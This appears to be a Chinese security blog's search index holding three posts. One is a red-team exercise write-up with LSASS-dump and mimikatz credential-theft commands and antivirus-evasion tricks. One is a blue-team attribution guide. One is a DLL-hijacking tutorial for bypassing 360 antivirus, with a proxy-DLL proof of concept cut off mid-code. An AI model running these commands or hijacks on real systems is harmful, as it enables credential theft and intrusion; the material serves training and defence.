<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>记一次某省会城市攻防演练总结</title>
    <link href="/2024/02/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9F%90%E7%9C%81%E4%BC%9A%E5%9F%8E%E5%B8%82%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E6%80%BB%E7%BB%93/"/>
    <url>/2024/02/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9F%90%E7%9C%81%E4%BC%9A%E5%9F%8E%E5%B8%82%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录一次前整子参与的攻防演练总结，在此期间也是大起大落，也是遇到问题并解决问题，为此也分享一下整个过程吧！</p><h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><p>此次攻防是抽签式的拿资产，应该是老天眷顾我们我们抽到的资产是挺不错的，这为我们后面铺好了路，为撒这么说呢，那就开始我们的正题！</p><p>不加思索拿到资产后当然是信息收集，信息收集就不多说了，就是各种工具，资产收集网站干就行了！</p><p>我们的资产里有一家商场单位，想都不想当然觉得商场好打了啊，那就先干它吧，也确实这家单位确实给了我们惊喜！一上来就给了我们一个shiro漏洞！</p><p>并且还是他们的官网！是不是挺离谱的，这才刚打一个小时我们就拿到了shell，搁谁都很开心的！</p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps16.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps17.jpg" alt="img"> </p><h2 id="攻入内网？"><a href="#攻入内网？" class="headerlink" title="攻入内网？"></a>攻入内网？</h2><p>拿到shell后也是做个维权放了一个内存马，爽呆呆那就开始内网吧，那就上个CS吧想着，先看看对方用的撒杀软吧，想来国内用的基本是360了应该问题不大，但是一查竟然是卡巴斯基，擦！转头就问队友卡巴你的马能过吗？他说没问题！好那就上吧！可惜一上就被杀，哈哈！转脸就问队友不是能过嘛？说他测试可以…… 那想着就不上CS了吧，上个frp直接干吧。可是它是卡巴，用了几个代理都是直接被杀，当然也有小编菜的原因。</p><p>那该怎么办？直接用冰蝎自带的的代理吧，慢是慢了些能用就行，想着赶紧找个出网的linux机器做代理吧，那就让它慢慢扫呗，此时队友也在想别的办法。</p><p>可是老天不会让你一直幸运下去的吧！嗯，是的。网站没了！访问500了……</p><p>心想是被发现了吧！这么快，防守方反应挺快！</p><h2 id="信息收集第一天"><a href="#信息收集第一天" class="headerlink" title="信息收集第一天"></a>信息收集第一天</h2><p>第一个点没了虽然很难受，但依旧要勇猛向前冲啊，那就开始继续撕口子呗，还好这家资产还算多，继续新的信息收集吧，打攻防最重要的就是信息收集了而且要仔细！该单位发现有OA系统并且是泛微的，那肯定要打一遍历史漏洞了呀，当时肯定是没戏的了，那就想着看能不能拿到他们的工号去他们OA里翻翻有用的信息咯以及去钓鱼！</p><p>后面也没想着找他们工号了，毕竟直接找能拿shell的站比工号重要，但是在测试他们有一个系统时却发现了他们的工号，在点击帮助这里显示了他的工号，这里也是要仔细看每一个点，不然很可能就不会发现他们的工号了，这里埋个点，这个工号救了我们的命哈哈！</p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps18.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps19.jpg" alt="img"> </p><p>那行竟然发现了他们的工号，就去他们OA系统里看看吧，此时我就拿这个工号去登，密码这里不知道的但是可以猜啊或者去爆破，当然很幸运密码我输了一下是他的工号，好OA登进去了，并发现他是该集团的管理员，也可以说是运维人员的头头吧。在OA里各种找有用的信息。发现了他的企业邮箱并还有密码，挺开心的，那就去钓鱼呗！</p><p>是的，我们去钓了但是我们被发现了并还回信骂我们 哈哈 离谱，想着不应该啊防范意识挺高啊！（为撒会被发现文章结尾会说），那钓鱼不成，就继续信息收集呗，在他的OA系统里他因为是管理员嘛他在里面关联了上图观远数据的账号和密码，我们点击了下图中的BI管理驾驶舱，发现会跳转到观远数据这个系统去并直接进入了后台！（当然我也点了其他的系统，但是其他系统都是放在内网的无法访问），进入到观远数据这个系统发现这个系统很重要，里面可以控制其内部的十几台数据库以及各种私密信息，也是能拿不少分的。</p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps20.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps21.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps22.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps23.jpg" alt="img"> </p><h2 id="信息收集第二天"><a href="#信息收集第二天" class="headerlink" title="信息收集第二天"></a>信息收集第二天</h2><p>虽然上面的东西能让我们获得一定的分数。但是依旧没让我们进到内网，也是很急迫，这里我们还是去看看了我们的那个shiro的漏洞但还是访问不了，那就只能继续去找点了，第一天那个管理员的OA看完了，就想着去看看别的人员的OA会不会有别的有用信息呢，此时他们的OA还是可以爆破的也是通过他们工号的规律去做了一个账号和密码本，也是跑出了上万个账号，该说不说这家单位人还是挺多的，但是也拿了一些账号去继续翻信息但是没撒发现。</p><p>然后我又返回去那个管理员的账户再看看有没有遗漏的信息没注意到，可谁想他把密码改了！并把该系统加上了一个验证码验证功能！哈哈，想着又被发现了呗，心中骂娘中！</p><p>到饭点了想着吃完饭再干吧，晚上回到房间继续搞呗，想着web不行那就搞小程序，app呗，确实app上有收获，bp扫出来了一个大杀器！Log4j2漏洞，可以可以把这个喜讯告诉队友继续开搞，可惜的是这个app是在云上的并且没能返回shell，当然这里也没放弃，让队友再继续搞一下！（这里图丢了就不放图了哈）</p><h2 id="柳暗花明"><a href="#柳暗花明" class="headerlink" title="柳暗花明"></a>柳暗花明</h2><p>接上文说起，Log4j2漏洞依旧没利用成功，时间也一点点过去，该找的也找了，想着这家单位不行就放吧，看看其他单位的资产，但是队友已经拿到另一家单位的shell了并已经进入内网了！就让我们同步进行，毕竟想拿第一可不是干穿一家单位就行的，那我继续摸索现在这家单位吧！就那再认真些！我又换别的OA账号去登他们的OA再去看看，当然这次确实没白看，找到了很有用的信息，我们在OA里通过搜索账号和密码来找寻信息，看到了一个异速联的账号和密码，        其实这个异速联的账号和密码我第一天就看到了但是为撒没用呢，因为我队友发现了他们异速联的系统，并通过<em><strong>*admin&#x2F;admin*</strong></em> 登进去了但是里面是空的。</p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps24.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps25.jpg" alt="img"> </p><p>并且是第一天就发现了，但是想着里面是空的没法利用，这里为撒异速联挺重要呢，这里解释一下异速联这个系统吧。异速联就像vpn一样，里面的系统是直接通他们内网的系统，可以通过一些方法去拿到内网权限的。可以看看下面这篇文章:</p><p><a href="https://mp.weixin.qq.com/s/JaUATNCT1eEkXn9WpP4GaA">https://mp.weixin.qq.com/s/JaUATNCT1eEkXn9WpP4GaA</a></p><p>当时想着admin账户密码都不没东西估计其他帐号也没东西，所以第一天也没注意OA里的异速联账号和密码，但是时间快没了，就想着再试试他们的账号吧，确实惊喜来了用他们的账号就有东西了！</p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps26.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps27.jpg" alt="img"> </p><p>然后我们就可以利用我发的那篇文章去利用获取权限了，但是因为我们的马不能过卡巴斯基，我利用了另一个方法拿到了这台服务器的权限。</p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps28.jpg" alt="img"> </p><p>这里我发现了他们老OA是直接调用的这台服务器的IE游览器并且出网，那这不是简单多了，我直接下载了一个远控，GotoHTTP 这个和向日葵一样能直接控制这台服务器的桌面，因为它安装简单获取密码也简单，这里也推荐一篇文章讲述了怎么利用和方法，这个方法估计大家都晓得，在无法过杀软的情况下挺好用的。</p><p><a href="https://mp.weixin.qq.com/s/eseIP4rbP9ecpykDjQ--pg">https://mp.weixin.qq.com/s/eseIP4rbP9ecpykDjQ--pg</a></p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps29.jpg" alt="img"> </p><p>这里我们通过异速联的方法已经控制到了这台服务器的cmd.exe了，我们就可以去找GotoHTTP的配置文件拿到账号和密码并登陆了。</p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps30.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps31.jpg" alt="img"> </p><p>为了防止这个远控出问题以及这个远控还要收钱，所以我又给这台电脑按了一个ToDesk 哈哈，这里原谅我技术菜哈只能用这个方法了。</p><p>这里也是很开行成功进入了他们内网了，并把ToDesk账号密码告诉了他们，接下来不就轻松了嘛，想着能休息一下等会再搞内网吧，可是老天会让你这么轻松的干下去？不知道那个队友去吃饭时把ToDesk给退了，都知道新的ToDesk是在你退了之后会锁屏的，我正吃着零食呢望了一眼我的电脑发现怎么给锁屏了啊，因为我的GotoHTTP还没退，擦，立马问同事咋回事，可是已经晚了，屏幕被锁了，得需要密码才能登！</p><p> 又想着是卡巴斯基，直接用mimikatz绝对被杀，那就用其他方法把，我这里用的是下载的微软自己的工具Procdump.exe，用procdump.exe把进lsass.exe 的内存dump下来然后将文件放在本机再用mimikatz去读密码。</p><p>procdump.exe -accepteula -ma lsass.exe lsass.dmp </p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps32.jpg" alt="img"> </p><p>mimikatz.exe “sekurlsa::minidump lsass.dmp” “sekurlsa::logonPasswords full” exit </p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps33.jpg" alt="img"> </p><p>这里你直接去用它的IE游览器去微软官网去下Procdump.exe是不让下载的，可能是卡巴斯基拦了吧，当然在前面我安装那两款远控也是不能去他们官网直接下的原因应该也是卡巴斯基拦了，这里该怎么办呢，那就得解决啊，于是我就在自己本机把这些安装包放在了自己的vps上直接用IE游览器去访问我的vps下载这些工具就解决了，但是直接用自己的vps去下会有风险，这里我们也可以用****文叔叔，星际网盘****等方法把我们的工具放进去再下载也是一种方法，这里卡巴斯基就不会拦了，下载完后也要清理网站痕迹哈。</p><p>也是成功的获取到了服务器的密码并登陆成功，又可以继续浪了！<strong>这里说一下其实用这个方法获取服务器3389密码卡巴斯基是会拦截的</strong>，但是我不清楚为撒我会成功，因为在别的内网机子用一样的方法就会被拦，也真是运气好吧！当然绕过杀软读密码的方法挺多，这里也分享一下过卡巴斯基读密码的文章但不清楚现在能不能过了。</p><p><a href="https://mp.weixin.qq.com/s/WLP1soWz-_BEouMxTHLbzg">https://mp.weixin.qq.com/s/WLP1soWz-_BEouMxTHLbzg</a></p><p><a href="http://wiki.tidesec.com/docs/bypassav">http://wiki.tidesec.com/docs/bypassav</a></p><h2 id="漫游内网"><a href="#漫游内网" class="headerlink" title="漫游内网"></a>漫游内网</h2><p>这里也是成功进入内网了，由于卡巴的存在，我们在内网找了一台出网的Linux主机做的代理，配置完代理后就开始卡卡乱杀了，首先找到了他们运维管理平台获取到了他们的网络拓扑，这里的密码依旧是用的前期收集到了那个管理员的工号进去的，可以说这个管理员对我们帮助很大！</p><p>当然在内网中信息收集还是很重要的，比如在能访问的服务器上找游览器的账号密码、服务器上的存在xshell等连接工具的信息并解密获取密码、寻找密码本、用发现的密码寻找规则做密码本进行密码喷洒去获取更多的服务器权限并进一步获取各种内网信息。当然内网信息收集方法很多文章也很多都可以去学习。</p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/image-20240226174651111.png" alt="image-20240226174651111"></p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/image-20240226174703204.png" alt="image-20240226174703204"></p><p>接着就是用fscan和弱口令工具跑内网了，那内网弱口令肯定不会少啦，也是获取到了不少主机权限和数据库了，但是这不是我们想要的靶标啊，分也拿不满啊！</p><p>那就继续干吧，该单位内网中应该是没有域的但也可能是没发现吧，但他们内网中 ****vCenter*<em><strong>挺多的那要是拿下</strong></em>*vCenter*<em><strong>不也一样嘛！该说不说运气也是好其内网的</strong></em>*vCenter*<em><strong>都存在任意文件上传漏洞（CVE-2021-22005）就不好办了直接拿到shell并找到其配置文件并用脚本获取到Cookie直接成功登陆到</strong></em>*vCenter****后台并成功控制了其内部所有服务器，并获取靶标权限！下面是vCenter的利用文章。</p><p><a href="https://mp.weixin.qq.com/s/OmHCclNVrBgS2_ttWq3-Fg">https://mp.weixin.qq.com/s/OmHCclNVrBgS2_ttWq3-Fg</a></p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps36.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps37.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps38.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps39.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps40.jpg" alt="img"> </p><p>因为vCenter都存在漏洞使我们在这次内网中并没有过多去信息收集也让我们内网没花太多时间就结束了这家单位。</p><h2 id="收官"><a href="#收官" class="headerlink" title="收官"></a>收官</h2><p>最终呢通过队友的协作也是拿到了第一名的成绩，但是和某队是并列第一，又开始抽签打别的队伍的资产，真是要让我们拼个你死我活来，结果还是好的通过努力最终小胜对方，不过对方因为一些原因和主办方干了起来最终被取消成绩，也是挺猛的哈哈</p><p>再解释一下我们钓鱼为撒会被骂呢原来是在攻防前这家单位就是被钓鱼打穿过，怪不得反应很快。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1、在此次攻防中也是大起大落，确实在实战中很正常，也会遇到很多问题，但总会有解决的办法，要学会迂回作战。</p><p>2、信息收集还是很重要的，一定要仔细收集每一个点可能就会让你有意想不到的收获，就像文中最后的点就是利用的信息收集组合拳才拿到了权限。</p><p>3、在限制了下载路径时可以用自己的vps、文叔叔、星际网盘等方法去绕过，在自己免杀不好时或实战中马子不能用的情况很多也可以利用远控的方式来绕过杀软，也要注意ToDesk退出锁屏的问题，可以去用他们的老版就没这个问题。</p><p>4、大家都是为了混口饭吃一定要控制自己的脾气别和主办方硬刚啊。</p><p>5、免杀技术还是得提升啊，不然遇到一些杀软还真是问题。</p>]]></content>
    
    
    <categories>
      
      <category>红队攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>红队</tag>
      
      <tag>攻防</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>蓝队-溯源</title>
    <link href="/2024/02/26/%E8%93%9D%E9%98%9F-%E6%BA%AF%E6%BA%90/"/>
    <url>/2024/02/26/%E8%93%9D%E9%98%9F-%E6%BA%AF%E6%BA%90/</url>
    
    <content type="html"><![CDATA[<h1 id="含义"><a href="#含义" class="headerlink" title="含义:"></a>含义:</h1><p>溯源顾名思义就是通过一些技术手段和各种信息收集的方式来寻找到我们想要的攻击人员信息，并在次过程中尽可能的寻找出人员的全部信息。但是溯源也是存在运气成分的，并不是说任何攻击IP都能溯源到人，但我们可以尽量提供一些相关信息并写好溯源报告给甲方就行。</p><h2 id="溯源第一步：判断攻击IP类型"><a href="#溯源第一步：判断攻击IP类型" class="headerlink" title="溯源第一步：判断攻击IP类型"></a>溯源第一步：判断攻击IP类型</h2><p>一般我们在安全设备拿到攻击IP的时候都会想用微步在线等威胁平台去查询攻击IP的类型。</p><p><strong>·1 移动基站IP(即为手机热点IP）</strong></p><p><strong>·2 IDC服务器IP(即为云服务器厂商IP）</strong></p><p><strong>·3 企业专线IP（即为企业专用的网络出口）</strong></p><h2 id="溯源第二步：对不同IP溯源"><a href="#溯源第二步：对不同IP溯源" class="headerlink" title="溯源第二步：对不同IP溯源"></a>溯源第二步：对不同IP溯源</h2><p><strong>一：</strong>在拿到很多攻击IP的时候我们为了快速去寻找好溯源的IP，我们首先找云服务器IP去溯源、其次是企业专线。一般的情况我们不去看移动基站的IP，因为手机热点的IP溯源是很难溯源到人的，所以不浪费时间。</p><p><strong>二：</strong>对于企业专线的IP可以进行简单溯源，以及使用IP定位网站进行定位，运气好可以定位到某些公司的地址，那也算是溯源到了部分信息了。</p><p><strong>三：</strong>对于IDC服务器以及傀儡机的溯源方法我会通过另一份文档描述</p><h2 id="溯源第三步：其他溯源方法"><a href="#溯源第三步：其他溯源方法" class="headerlink" title="溯源第三步：其他溯源方法"></a>溯源第三步：其他溯源方法</h2><p><strong>一：</strong>通过客户在内外网的蜜罐进行溯源，很多蜜罐是可以获取一些攻击人员信息的，我们可以利用这个方法来深度溯源</p><p><strong>二：</strong>通过查看安全设备，观察其攻击流量，在有些攻击人员在大意中会将其私密信息暴漏在攻击流量中，比如手机号之类的，要是遇到了这样的流量我们可以提取其中的信息去深度溯源。</p><p><strong>三：</strong> 有些时候会存在钓鱼攻击的情况，那我们可以去分析其钓鱼的样本去查看它的C2服务器或者其他信息，也可以看看对方使用的是什么邮箱来钓鱼的，有些大意的攻击人员会用自己的邮箱去钓鱼，那我们就可以利用其邮箱去溯源。</p><p><strong>四：</strong>还有一些溯源方法就不是技术手段能达到的了，比如依靠公安、服务器厂商调取注册个人信息、以及一些小的IDC厂商直接获取服务权限等方法溯源。当然这些我们不需要，只是拓展一下思路。</p><h2 id="溯源第四步：写溯源报告"><a href="#溯源第四步：写溯源报告" class="headerlink" title="溯源第四步：写溯源报告"></a>溯源第四步：写溯源报告</h2><p><strong>一：</strong>在我们前期通过各种上述溯源思路以及别的溯源思路去溯源到信息后我们可以写溯源报告了，把整个过程完整的写清楚即可，要是没有溯源到人，就比如是傀儡机等其他情况我们也只需要把我们溯源到的信息完整的写份报告就行，毕竟溯源也是有运气成分的，所以尽力就行。</p><h2 id="溯源所需工具及网站"><a href="#溯源所需工具及网站" class="headerlink" title="溯源所需工具及网站"></a>溯源所需工具及网站</h2><p>一：IP定位信息网站</p><p><a href="https://website.informer.com/">https://website.informer.com/</a></p><p><a href="https://ip.bczs.net/">https://ip.bczs.net/</a></p><p><a href="https://pulsedive.com/">https://pulsedive.com/</a></p><p><a href="https://www.abuseipdb.com/">https://www.abuseipdb.com/</a></p><p><a href="https://anti-hacker-alliance.com/">https://anti-hacker-alliance.com/</a></p><p>二：ICP备案查询</p><p><a href="https://www.beianx.cn/">https://www.beianx.cn/</a></p><p><a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a></p><p>三：威胁情报平台</p><p><a href="https://x.threatbook.com/">https://x.threatbook.com/</a></p><p><a href="https://ti.qianxin.com/">https://ti.qianxin.com/</a></p><p>四：资产收集平台</p><p><a href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a></p><p><a href="https://fofa.info/">https://fofa.info/</a></p><p>五：手机号注册网站查询</p><p><a href="https://www.reg007.com/">https://www.reg007.com/</a></p><p>六：企业备案信息</p><p><a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a></p><p>七：网站回溯平台</p><p><a href="https://archive.org/web/">https://archive.org/web/</a></p><p>八：IP定位</p><p><a href="https://www.opengps.cn/Data/IP/LocHighAcc.aspx">https://www.opengps.cn/Data/IP/LocHighAcc.aspx</a></p><h2 id="溯源文章"><a href="#溯源文章" class="headerlink" title="溯源文章"></a>溯源文章</h2><p><a href="https://blog.csdn.net/weixin_46684578/article/details/114489576"><strong>https://blog.csdn.net/weixin_46684578&#x2F;article&#x2F;details&#x2F;114489576</strong></a></p><p><a href="https://www.sohu.com/a/417803746_658302"><strong>https://www.sohu.com/a/417803746_658302</strong></a></p><p><a href="https://zhuanlan.zhihu.com/p/538427399"><strong>https://zhuanlan.zhihu.com/p/538427399</strong></a></p><p><a href="https://www.freebuf.com/articles/network/346936.html"><strong>https://www.freebuf.com/articles/network/346936.html</strong></a></p><p><a href="https://blog.hsm.cool/index.php/archives/771/"><strong>https://blog.hsm.cool/index.php/archives/771/</strong></a></p><p><a href="https://www.sec-in.com/article/1834?action=comment"><strong>https://www.sec-in.com/article/1834?action=comment</strong></a></p><h2 id="溯源具体细节"><a href="#溯源具体细节" class="headerlink" title="溯源具体细节"></a>溯源具体细节</h2><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/image-20240226161639906.png"></p><p><strong>PDF版</strong></p><p><a href="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/blob/main/img/idc%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BA%AF%E6%BA%90.pdf">https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/blob/main/img/idc服务器溯源.pdf</a></p>]]></content>
    
    
    <categories>
      
      <category>蓝队</category>
      
    </categories>
    
    
    <tags>
      
      <tag>蓝队</tag>
      
      <tag>溯源</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DLL挖掘及突破360核晶利用</title>
    <link href="/2024/02/26/DLL%E6%8C%96%E6%8E%98%E5%8F%8A%E7%AA%81%E7%A0%B4360%E6%A0%B8%E6%99%B6%E5%88%A9%E7%94%A8/"/>
    <url>/2024/02/26/DLL%E6%8C%96%E6%8E%98%E5%8F%8A%E7%AA%81%E7%A0%B4360%E6%A0%B8%E6%99%B6%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>随着现在防护产品的升级和大规模的普及，现在想要突破AV和EDR的防护来达到免杀上线及后续的高危操作大家跟加会去利用白加黑的方法来实现目的，而且市面上很多APT组织都会利用这种方式来入侵，为撒都会青睐这种方式呢，无非就是简单高效并且节约成本。接下来我会讲一下怎么去挖DLL的方法和利用。至于DLL劫持的原理我就不过多介绍了，相信社区的大佬们都了解。</p><h2 id="DLL挖掘"><a href="#DLL挖掘" class="headerlink" title="DLL挖掘"></a>DLL挖掘</h2><p>在挖掘dll时都会用到一个工具叫process monitor这个工具，这个工具可以让我们快速的去寻找能被劫持的dll，该工具可以让我们去查询软件下运行的dll，但是我们为了加快寻找速度我们可以做一些搜索限制来让我们更快的去寻找能劫持的dll，下图的红框就是我们要做的搜索限制</p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps1.jpg" alt="img"> </p><p>这里我们找个厂商来做一次测试</p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps2.jpg" alt="img"> </p><p>发现了能被劫持的dll，这里我们测试的dll 为 dbghelp.dll</p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps3.jpg" alt="img"> </p><p>但是我们去查看这个dll时发现它不存在 LoadLibraryExW 和 LoadLibraryw 函数则是无法被直接利用的，要是直接利用的话是会提示报错，这里是因为导入表和导出表的问题，我们需要将这个dll需要的函数导入进去才能利用</p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps4.jpg" alt="img"> </p><p>提示报错</p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps5.jpg" alt="img"> </p><p>接下来我们可以将需要的函数写进去就行，这里我们通过VS的dumpbin.exe去查看dbghelp.dll所需要的函数并编写POC</p><p>dumpbin.exe &#x2F;imports .\bugreport64.exe</p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps6.jpg" alt="img"> </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;pch.h&quot;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span> </span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">StackWalk</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123; <br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125; <br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">SymFunctionTableAccess</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123; <br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125; <br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">SymCleanup</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123; <br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125; <br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">SymSetOptions</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125; <br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">SymGetModuleInfoW</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123; <br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125; <br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">SymLoadModule</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123; <br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125; <br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">SymInitialize</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123; <br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125; <br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">SymGetModuleInfo</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123; <br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125; <br>STARTUPINFO si = &#123;<span class="hljs-number">0</span>&#125;; <br>PROCESS_INFORMATION pi = &#123;<span class="hljs-number">0</span>&#125;; <br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule, </span></span><br><span class="hljs-params"><span class="hljs-function">DWORD ul_reason_for_call, </span></span><br><span class="hljs-params"><span class="hljs-function">LPVOID lpReserved </span></span><br><span class="hljs-params"><span class="hljs-function">)</span> </span><br><span class="hljs-function"></span>&#123; <br><span class="hljs-keyword">switch</span> (ul_reason_for_call) <br>&#123; <br><span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH: <br><span class="hljs-built_in">CreateProcessA</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-comment">// No module name (use command line) </span><br>(LPSTR)<span class="hljs-string">&quot;calc.exe&quot;</span>, <span class="hljs-comment">// Command line </span><br><span class="hljs-literal">NULL</span>, <span class="hljs-comment">// Process handle not inheritable </span><br><span class="hljs-literal">NULL</span>, <span class="hljs-comment">// Thread handle not inheritable </span><br>FALSE, <span class="hljs-comment">// Set handle inheritance to FALSE </span><br><span class="hljs-number">0</span>, <span class="hljs-comment">// No creation flags </span><br><span class="hljs-literal">NULL</span>, <span class="hljs-comment">// Use parent&#x27;s environment block </span><br><span class="hljs-literal">NULL</span>, <span class="hljs-comment">// Use parent&#x27;s starting directory </span><br>(LPSTARTUPINFOA)&amp;si, <span class="hljs-comment">// Pointer to STARTUPINFO structure </span><br>(LPPROCESS_INFORMATION)&amp;pi <span class="hljs-comment">// Pointer to </span><br>PROCESS_INFORMATION structure <br>); <br><span 